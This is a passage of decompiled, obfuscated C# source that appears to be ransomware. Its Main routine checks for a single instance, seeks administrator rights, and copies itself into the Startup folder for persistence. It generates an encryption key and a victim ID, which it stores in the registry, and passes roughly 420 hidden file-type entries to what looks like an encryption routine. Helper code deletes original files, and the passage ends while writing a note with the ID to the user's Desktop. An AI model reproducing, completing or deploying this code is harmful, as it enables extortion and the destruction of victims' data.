									MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (JkprrzFPchvjDH)
								{
									try
									{
										File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107387760) + ex12.Message + getString_0(107396721));
									}
									catch (Exception)
									{
									}
								}
								rYmLUpWPpFDd++;
								return;
							}
						}
						if (intMyWSRTiS)
						{
							if (HuMjnShEiYDem != getString_0(107388318))
							{
								JrgWtVXefnyJtd(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, bytes2);
							}
							else
							{
								JrgWtVXefnyJtd(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			nvCiGIukQFkQKz.Remove(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
		}

		static AAfgHfRmqtNe()
		{
			Strings.CreateGetStringDelegate(typeof(AAfgHfRmqtNe));
		}
	}

	private sealed class jIoUzMoxORXEG
	{
		public string FVQCuNlnliiHQjX;

		public string BYGkNDQUwHTZtcR;

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					File.Delete(FVQCuNlnliiHQjX);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					if (File.Exists(BYGkNDQUwHTZtcR))
					{
						File.Delete(BYGkNDQUwHTZtcR);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string GJaEJRItHBd;

	public static byte[] ignBTzWcyfBJ;

	public static string ZkQXlCKgLq;

	public static string ZnQTsnSydQf;

	public static List<string> SCtDlgPmJoxb;

	public static List<string> pYmJKiQZCFtxWj;

	public static string kxXDyGjuxJIkOF;

	public static string geYnJRldqTc;

	public static string QcVyigtSkYPoO;

	public static string OpvlVUeWPNde;

	public static string HDUaBrvPpWiZ;

	public static int nAQNcYgrPfbd;

	public static string eWnObXCrwa;

	public static string XbbYlNWZvxei;

	public static string GavejwdGXBtM;

	public static string YJrkkJhMpjz;

	public static string YipLIDiytJkIoMpj;

	public static string odhMhxtPBogI;

	public static string YgaAcejEvHw;

	public static string jsoiRzVmarLdbDEq;

	public static List<string> tpQHxZryBWxPYRj;

	public static List<string> MoDypcoPNXgE;

	public static string gzNBFyGUZAHaYj;

	public static string bhwSpcunnfDui;

	public static string xXWXzZCyuWyl;

	public static List<string> eSzXPgKVtFvzPRkO;

	public static string NlflDRvxbUWSt;

	private static string ZPIQxeyUyHA;

	public static string XedFtYAsIv;

	public static string xQXYhPfzOLMNVIZ;

	public static List<string> gMnkSYDGfkIz;

	public static List<string> afIyHEhrCnpR;

	public static List<string> zEPGrWzbUQpV;

	public static List<string> SCdvQOqShIfe;

	public static string ErguQgjhMKVLnS;

	public static List<string> xzDSpJguZcbP;

	public static List<string> NcbSEHMiSI;

	public static string ISThgQIFtJPzEx;

	public static string DwNHVmXMDJftXCxA;

	internal static DateTime pPVvULAneWZua;

	internal static DateTime vholFJAvnmHlq;

	public static string pxgfCwkrtMaZuuMB;

	public static string reMazhEZDt;

	public static string SHpmwzPilAcVsR;

	public static string dZIbYNGfmZApsZd;

	public static string MFKKCGgtmIAW;

	public static string sLnqamEcKwYO;

	public static string zTCPCwjwADUd;

	public static string ZQgJcWfPvJPQ;

	public static List<string> CCPXDRhgflzG;

	public static string pvxdiQpIegI;

	public static string WciFeGiWIPgj;

	public static string AjQigOGqXedpaGqDk;

	public static string YTZvEldDkPpHZ;

	public static string woIOBCFOOFhlRn;

	public static string UObhemfryie;

	public static string uXpdCmvnxfyV;

	public static string gnkLqwUIDpnoIoELL;

	public static string DdPKSSdHAf;

	public static string KtRBPSseqispNpz;

	public static string TfVNRoivSZg;

	public static string cIUZZkwMklD;

	public static string wWnQPVWMnAQLeIOR;

	public static string NfFarPiJPL;

	public static string CrKlHXnOdhXo;

	public static string CKMSExNPzZHC;

	public static string vEXrKbJFSmEGOp;

	public static string QlEKeYhMjnU;

	public static string vtcLgmPLsMgV;

	public static string GlAFQHcfgEJyh;

	public static string IbBwmvICpJQnE;

	public static string jhONqlUHAFtixvCn;

	public static string coTyYysvNimxzp;

	public static string sTgORtsqygBpd;

	public static string jJTxLnMtOyZg;

	public static string XkZyuHqUrQdaWf;

	public static string aRGMufFvIRcdU;

	public static string LDqlcaJGohcRKI;

	public static string PVrYUzBrvLL;

	public static string[] kaCQkWvEmRwtDb;

	public static string GEhrwQCvgoMn;

	public static bool nWlczaiPXm;

	public static string yIbhNgrpygqn;

	public static bool intMyWSRTiS;

	public static bool QHavcRjyWenIGM;

	public static bool kDsmygHmYhQIyZ;

	public static bool qBctdZYmhWs;

	public static string AIOBtLgIwjoLs;

	public static bool JkprrzFPchvjDH;

	public static bool yQigrfrYMyIiVoJ;

	public static bool eMwXuwrMrLlHPTPbP;

	public static bool vIHVrrLyyUkl;

	public static bool gBBPJhiOSqWIX;

	public static string eZSiHLWxxOCmd;

	public static bool COsiatrWvUa;

	public static Stopwatch dswNsONYQGtdB;

	public static int rYmLUpWPpFDd;

	public static int vYQbqQWbSUgNb;

	public static bool pkQDLnznjdsc;

	public static string UKBmvHPuuZLTSs;

	public static string[] NczSZeOnLpX;

	public static List<string> EMpnMrcluLOg;

	public static int uZwmuWmXUPb;

	public static bool mrwrmrZdaUQCXK;

	public static bool YLZDxMoTnJywGI;

	public static List<string> JwVsMsMusHaN;

	public static List<string> PEhDWxwiaMC;

	public static List<string> CRLdtxGaXidO;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			SWZmPwJBhoj CS_0024_003C_003E8__locals0 = new SWZmPwJBhoj();
			CS_0024_003C_003E8__locals0.AofojBvlIqaN = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.AofojBvlIqaN) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		if (LDqlcaJGohcRKI == getString_0(107396935) && !new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				ddxTokUTHjtkR.ihuckvjbrNv();
			}
			catch
			{
			}
		}
		try
		{
			psoRLWlJttwcY.gtzhRzWsmqiqQH(ZPIQxeyUyHA);
		}
		catch (Exception)
		{
		}
		try
		{
			if (XkZyuHqUrQdaWf == getString_0(107396935))
			{
				Thread thread = new Thread(JFYnHubrVn.LXMkckSSiG);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (GavejwdGXBtM == getString_0(107396935))
		{
			Thread.Sleep(int.Parse(YJrkkJhMpjz));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && zTCPCwjwADUd == getString_0(107396935))
		{
			try
			{
				dVUyxumSlHQj(dOioDTBjWKE(getString_0(107396898)));
			}
			catch
			{
			}
		}
		try
		{
			if (YgaAcejEvHw == getString_0(107396935) && qaspRdlidFLL.RHtYIrYKwroGkaq())
			{
				new XfdGPWBICppdJ().JWUPFJWfMdmBGFlL(bool_0: false);
				qaspRdlidFLL.TZIikIaNPzUgWrE();
			}
		}
		catch (Exception)
		{
		}
		if (bhwSpcunnfDui == getString_0(107396935) && qaspRdlidFLL.RHtYIrYKwroGkaq())
		{
			new XfdGPWBICppdJ().JWUPFJWfMdmBGFlL(bool_0: false);
			new XfdGPWBICppdJ().GFGXetqyjyB();
		}
		if (XbbYlNWZvxei == getString_0(107396935))
		{
			BoLOKfHyyCVOCeg.ktXURWyUWDsyQT();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396793);
			string text2 = text + Path.GetFileName(fileName);
			if (HDUaBrvPpWiZ == getString_0(107396935) && fileName != text2)
			{
				Thread thread2 = new Thread(RhnmNEJZkTvAy);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (kxXDyGjuxJIkOF == getString_0(107396935) && mainModule != null && fileName != text2)
			{
				try
				{
					nAQNcYgrPfbd = NADidBdwdjtek(0, tpQHxZryBWxPYRj.Count);
					File.Copy(fileName, text + tpQHxZryBWxPYRj[nAQNcYgrPfbd], overwrite: true);
					Process.Start(text + tpQHxZryBWxPYRj[nAQNcYgrPfbd]);
					XbTVyboAGqHQlSpf();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ISThgQIFtJPzEx == getString_0(107396935) && DateTime.Now < pPVvULAneWZua)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (DwNHVmXMDJftXCxA == getString_0(107396935) && DateTime.Now > vholFJAvnmHlq)
			{
				XbTVyboAGqHQlSpf();
			}
		}
		catch
		{
		}
		UcTtzUrPage();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = afIyHEhrCnpR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387720)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source2 = zEPGrWzbUQpV;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (PVrYUzBrvLL == getString_0(107396935))
				{
					string[] source3 = kaCQkWvEmRwtDb;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), getString_0(107387650) + string_0 + getString_0(107387641));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!XOkMXYHVKKZne().Contains(getString_0(107388385)))
				{
					rwWAvGEeNhr(ErguQgjhMKVLnS);
				}
				else
				{
					List<string> sCdvQOqShIfe = SCdvQOqShIfe;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							OrQEYkCSRFdRrs(dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107387636))), string_0);
						};
					}
					Parallel.ForEach(sCdvQOqShIfe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source4 = xzDSpJguZcbP;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387611)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396788))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396788)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396771)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !SCtDlgPmJoxb.Contains(text6) && text6 != getString_0(107396782) && text6 != getString_0(107396729) && text6 != getString_0(107396740))
								{
									SCtDlgPmJoxb.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397223)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397178))
						{
							wWnQPVWMnAQLeIOR = getString_0(107396935);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397201))
						{
							wWnQPVWMnAQLeIOR = getString_0(107397192);
						}
					}
					if (text3.Contains(getString_0(107397155)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397178))
						{
							COsiatrWvUa = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397201))
						{
							COsiatrWvUa = false;
						}
					}
					if (text3.Contains(getString_0(107397170)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397178))
						{
							JkprrzFPchvjDH = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397201))
						{
							JkprrzFPchvjDH = false;
						}
					}
					if (text3.Contains(getString_0(107397157)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397178))
						{
							mrwrmrZdaUQCXK = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397201))
						{
							mrwrmrZdaUQCXK = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(AIOBtLgIwjoLs, getString_0(107397128) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (wWnQPVWMnAQLeIOR == getString_0(107397192))
		{
			pYwUBHSIbCFztxeI();
		}
		if (YLZDxMoTnJywGI)
		{
			try
			{
				Console.WriteLine(getString_0(107397051));
				WFOPLZZKfJP.QnwziTRqMiOGl();
			}
			catch (Exception ex8)
			{
				if (JkprrzFPchvjDH)
				{
					try
					{
						File.AppendAllText(AIOBtLgIwjoLs, getString_0(107397030) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (wWnQPVWMnAQLeIOR == getString_0(107396935))
		{
			try
			{
				zRNcVXsdYsOXN();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && kDsmygHmYhQIyZ)
			{
				try
				{
					Thread thread4 = new Thread(aECIkZoWMvdiXg.HAVsrHXFHlE);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			OrQEYkCSRFdRrs(getString_0(107396441), dOioDTBjWKE(getString_0(107396460)));
		}
		SecureString secureString = new SecureString();
		if (SHpmwzPilAcVsR == getString_0(107397192))
		{
			geYnJRldqTc = mPZHeAmBXOW.NknwnSRhtiQplA(32);
			QcVyigtSkYPoO = mPZHeAmBXOW.IDARSyoZrvbC();
		}
		else
		{
			geYnJRldqTc = getString_0(107396355);
		}
		OpvlVUeWPNde = GzxfJecXtrCbXb.kbfqQxGdxRHX(geYnJRldqTc + QcVyigtSkYPoO);
		if (!intMyWSRTiS)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(dOioDTBjWKE(getString_0(107396310)));
				if (registryKey != null)
				{
					registryKey.SetValue(dOioDTBjWKE(getString_0(107396297)) + (registryKey.ValueCount + 1), OpvlVUeWPNde);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(dOioDTBjWKE(getString_0(107396310)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(dOioDTBjWKE(getString_0(107396297)) + (registryKey2.ValueCount + 1), OpvlVUeWPNde);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (eMwXuwrMrLlHPTPbP)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), eZSiHLWxxOCmd)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), eZSiHLWxxOCmd), string.Concat(dOioDTBjWKE(getString_0(107396256)), new WebClient().DownloadString(dOioDTBjWKE(getString_0(107396263))), getString_0(107396702), dOioDTBjWKE(getString_0(107396697)), DateTime.Now, getString_0(107396702), dOioDTBjWKE(getString_0(107396688)), OpvlVUeWPNde));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), eZSiHLWxxOCmd), getString_0(107396599) + OpvlVUeWPNde);
				}
			}
			catch (Exception ex13)
			{
				if (JkprrzFPchvjDH)
				{
					try
					{
						File.AppendAllText(AIOBtLgIwjoLs, getString_0(107396570) + ex13.Message + getString_0(107396702));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		IQmtGEropNLZJ.GXmdUnCikbQcw(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), GlAFQHcfgEJyh), GIJmxTtMyJmaSPq(OpvlVUeWPNde), null, null, getString_0(107396553), getString_0(107396504), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			mZBrMdsTqqBMGCly();
		}
		try
		{
			try
			{
				if (COsiatrWvUa)
				{
					Console.WriteLine(getString_0(107396519));
				}
			}
			catch
			{
			}
			ilNNSiSXIXwhU(new string[1] { getString_0(107395926) }, new string[420]
			{
				getString_0(107395949),
				getString_0(107395944),
				getString_0(107395907),
				getString_0(107395898),
				getString_0(107395893),
				getString_0(107395920),
				getString_0(107395915),
				getString_0(107395910),
				getString_0(107395873),
				getString_0(107395868),
				getString_0(107395863),
				getString_0(107395890),
				getString_0(107395881),
				getString_0(107395876),
				getString_0(107395835),
				getString_0(107395830),
				getString_0(107395857),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395810),
				getString_0(107395801),
				getString_0(107395796),
				getString_0(107395823),
				getString_0(107395818),
				getString_0(107395813),
				getString_0(107395776),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395793),
				getString_0(107395788),
				getString_0(107395783),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395736),
				getString_0(107395759),
				getString_0(107395754),
				getString_0(107395749),
				getString_0(107395712),
				getString_0(107395915),
				getString_0(107395707),
				getString_0(107395873),
				getString_0(107395730),
				getString_0(107395725),
				getString_0(107395720),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396185),
				getString_0(107396180),
				getString_0(107396207),
				getString_0(107396202),
				getString_0(107396197),
				getString_0(107396160),
				getString_0(107396155),
				getString_0(107396150),
				getString_0(107396177),
				getString_0(107396172),
				getString_0(107396167),
				getString_0(107396130),
				getString_0(107396121),
				getString_0(107396116),
				getString_0(107396139),
				getString_0(107396094),
				getString_0(107395707),
				getString_0(107396113),
				getString_0(107396104),
				getString_0(107396063),
				getString_0(107396054),
				getString_0(107396077),
				getString_0(107396068),
				getString_0(107396031),
				getString_0(107396022),
				getString_0(107396045),
				getString_0(107396036),
				getString_0(107395999),
				getString_0(107395994),
				getString_0(107395989),
				getString_0(107396016),
				getString_0(107396011),
				getString_0(107396006),
				getString_0(107395965),
				getString_0(107395960),
				getString_0(107395987),
				getString_0(107395982),
				getString_0(107395977),
				getString_0(107395972),
				getString_0(107395419),
				getString_0(107395442),
				getString_0(107395437),
				getString_0(107395741),
				getString_0(107395432),
				getString_0(107395395),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395380),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395361),
				getString_0(107395352),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395369),
				getString_0(107395364),
				getString_0(107395327),
				getString_0(107395322),
				getString_0(107395345),
				getString_0(107395340),
				getString_0(107395335),
				getString_0(107395298),
				getString_0(107395293),
				getString_0(107395288),
				getString_0(107395315),
				getString_0(107395310),
				getString_0(107395305),
				getString_0(107395300),
				getString_0(107395263),
				getString_0(107395258),
				getString_0(107395281),
				getString_0(107395276),
				getString_0(107395271),
				getString_0(107395234),
				getString_0(107395229),
				getString_0(107395224),
				getString_0(107395251),
				getString_0(107395246),
				getString_0(107395241),
				getString_0(107395200),
				getString_0(107395195),
				getString_0(107395218),
				getString_0(107395213),
				getString_0(107395208),
				getString_0(107395683),
				getString_0(107395678),
				getString_0(107395669),
				getString_0(107395696),
				getString_0(107395691),
				getString_0(107395686),
				getString_0(107395649),
				getString_0(107395644),
				getString_0(107395639),
				getString_0(107395666),
				getString_0(107395661),
				getString_0(107395656),
				getString_0(107395619),
				getString_0(107395614),
				getString_0(107395609),
				getString_0(107395604),
				getString_0(107395627),
				getString_0(107395622),
				getString_0(107395585),
				getString_0(107395580),
				getString_0(107395603),
				getString_0(107395594),
				getString_0(107395589),
				getString_0(107395552),
				getString_0(107395547),
				getString_0(107395542),
				getString_0(107395569),
				getString_0(107395564),
				getString_0(107395559),
				getString_0(107395522),
				getString_0(107395517),
				getString_0(107395512),
				getString_0(107395539),
				getString_0(107395534),
				getString_0(107395529),
				getString_0(107395524),
				getString_0(107395487),
				getString_0(107395482),
				getString_0(107395505),
				getString_0(107395500),
				getString_0(107395459),
				getString_0(107395446),
				getString_0(107395465),
				getString_0(107394912),
				getString_0(107394903),
				getString_0(107394926),
				getString_0(107394917),
				getString_0(107394876),
				getString_0(107394871),
				getString_0(107394894),
				getString_0(107394885),
				getString_0(107394844),
				getString_0(107394839),
				getString_0(107394866),
				getString_0(107394861),
				getString_0(107394856),
				getString_0(107394819),
				getString_0(107394814),
				getString_0(107394805),
				getString_0(107394832),
				getString_0(107394827),
				getString_0(107394822),
				getString_0(107394785),
				getString_0(107394780),
				getString_0(107394803),
				getString_0(107394794),
				getString_0(107394789),
				getString_0(107395609),
				getString_0(107394752),
				getString_0(107394747),
				getString_0(107394742),
				getString_0(107394765),
				getString_0(107394760),
				getString_0(107394723),
				getString_0(107394714),
				getString_0(107394709),
				getString_0(107394736),
				getString_0(107394731),
				getString_0(107394726),
				getString_0(107394689),
				getString_0(107395305),
				getString_0(107394680),
				getString_0(107394707),
				getString_0(107394702),
				getString_0(107394697),
				getString_0(107394692),
				getString_0(107395167),
				getString_0(107395162),
				getString_0(107395157),
				getString_0(107395184),
				getString_0(107395179),
				getString_0(107395174),
				getString_0(107395137),
				getString_0(107395132),
				getString_0(107395127),
				getString_0(107395150),
				getString_0(107395141),
				getString_0(107395104),
				getString_0(107395099),
				getString_0(107395094),
				getString_0(107395121),
				getString_0(107395116),
				getString_0(107395111),
				getString_0(107395074),
				getString_0(107395069),
				getString_0(107395060),
				getString_0(107395083),
				getString_0(107395078),
				getString_0(107395041),
				getString_0(107395036),
				getString_0(107395031),
				getString_0(107395058),
				getString_0(107395053),
				getString_0(107395048),
				getString_0(107395011),
				getString_0(107395006),
				getString_0(107395053),
				getString_0(107395048),
				getString_0(107395001),
				getString_0(107394996),
				getString_0(107395023),
				getString_0(107395018),
				getString_0(107395013),
				getString_0(107394976),
				getString_0(107394971),
				getString_0(107394966),
				getString_0(107394993),
				getString_0(107394988),
				getString_0(107394983),
				getString_0(107394942),
				getString_0(107394933),
				getString_0(107394956),
				getString_0(107394403),
				getString_0(107394394),
				getString_0(107394417),
				getString_0(107394412),
				getString_0(107394407),
				getString_0(107394370),
				getString_0(107395873),
				getString_0(107395224),
				getString_0(107394365),
				getString_0(107394360),
				getString_0(107394387),
				getString_0(107394382),
				getString_0(107394377),
				getString_0(107394372),
				getString_0(107394335),
				getString_0(107394326),
				getString_0(107394349),
				getString_0(107394340),
				getString_0(107394299),
				getString_0(107394322),
				getString_0(107394313),
				getString_0(107394308),
				getString_0(107394271),
				getString_0(107394266),
				getString_0(107394261),
				getString_0(107394288),
				getString_0(107394283),
				getString_0(107395322),
				getString_0(107394238),
				getString_0(107394233),
				getString_0(107396180),
				getString_0(107395564),
				getString_0(107396036),
				getString_0(107394844),
				getString_0(107394228),
				getString_0(107394255),
				getString_0(107394250),
				getString_0(107394245),
				getString_0(107394208),
				getString_0(107394199),
				getString_0(107394222),
				getString_0(107394217),
				getString_0(107394212),
				getString_0(107394175),
				getString_0(107394170),
				getString_0(107394165),
				getString_0(107394192),
				getString_0(107394187),
				getString_0(107394182),
				getString_0(107394657),
				getString_0(107394652),
				getString_0(107394647),
				getString_0(107394674),
				getString_0(107394665),
				getString_0(107394624),
				getString_0(107394619),
				getString_0(107394614),
				getString_0(107394641),
				getString_0(107394636),
				getString_0(107394631),
				getString_0(107394594),
				getString_0(107394589),
				getString_0(107394584),
				getString_0(107394611),
				getString_0(107394606),
				getString_0(107394597),
				getString_0(107394556),
				getString_0(107394551),
				getString_0(107394578),
				getString_0(107394573),
				getString_0(107394568),
				getString_0(107394531),
				getString_0(107394526),
				getString_0(107394517),
				getString_0(107394540),
				getString_0(107394535),
				getString_0(107394498),
				getString_0(107394493),
				getString_0(107395053),
				getString_0(107395048),
				getString_0(107394488),
				getString_0(107394515),
				getString_0(107394510),
				getString_0(107394505),
				getString_0(107394500),
				getString_0(107394463),
				getString_0(107394458),
				getString_0(107394453),
				getString_0(107394480),
				getString_0(107394475),
				getString_0(107394470),
				getString_0(107394433),
				getString_0(107394428),
				getString_0(107394423),
				getString_0(107394450),
				getString_0(107394445),
				getString_0(107394440),
				getString_0(107393891),
				getString_0(107393886),
				getString_0(107393881),
				getString_0(107393876),
				getString_0(107393903),
				getString_0(107393898),
				getString_0(107393893),
				getString_0(107393856),
				getString_0(107393851),
				getString_0(107393846),
				getString_0(107393873),
				getString_0(107393868),
				getString_0(107393863),
				getString_0(107393826),
				getString_0(107393817),
				getString_0(107393840),
				getString_0(107393835),
				getString_0(107393830),
				getString_0(107393789),
				getString_0(107393780),
				getString_0(107393807),
				getString_0(107393802),
				getString_0(107393797),
				getString_0(107393760),
				getString_0(107393755),
				getString_0(107393750),
				getString_0(107393777),
				getString_0(107393772),
				getString_0(107393767),
				getString_0(107393730),
				getString_0(107393725),
				getString_0(107393716),
				getString_0(107393739),
				getString_0(107393734),
				getString_0(107393697),
				getString_0(107393692),
				getString_0(107393687),
				getString_0(107393710),
				getString_0(107395813),
				getString_0(107395649),
				getString_0(107393701),
				getString_0(107393660),
				getString_0(107393683),
				getString_0(107393674),
				getString_0(107395094),
				getString_0(107395099),
				getString_0(107394145),
				getString_0(107394140),
				getString_0(107394135),
				getString_0(107394162),
				getString_0(107395712),
				getString_0(107394157),
				getString_0(107394152),
				getString_0(107394115),
				getString_0(107394110),
				getString_0(107394105),
				getString_0(107394100),
				getString_0(107394127),
				getString_0(107394122),
				getString_0(107394117),
				getString_0(107394080)
			}, new string[0], geYnJRldqTc, getString_0(107394075));
		}
		catch (Exception ex15)
		{
			if (JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(AIOBtLgIwjoLs, getString_0(107394038) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013));
				streamWriter.WriteLine(dOioDTBjWKE(getString_0(107394020)));
				streamWriter.WriteLine(getString_0(107396702));
				streamWriter.WriteLine(dOioDTBjWKE(getString_0(107391930)));
				streamWriter.WriteLine(OpvlVUeWPNde);
				if (XedFtYAsIv == getString_0(107397192))
				{
					streamWriter.WriteLine(getString_0(107396702));
					streamWriter.WriteLine(dOioDTBjWKE(getString_0(107391897)) + Convert.ToString(eSzXPgKVtFvzPRkO.Count));
				}
				if (pkQDLnznjdsc)
				{
					streamWriter.WriteLine(getString_0(107396702));
					streamWriter.WriteLine(dOioDTBjWKE(getString_0(107391340)));
					streamWriter.WriteLine(OTEZtdtAZBqJ.wvJsjjHPPBP());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013));
				if (!text11.Contains(OpvlVUeWPNde) && !intMyWSRTiS)
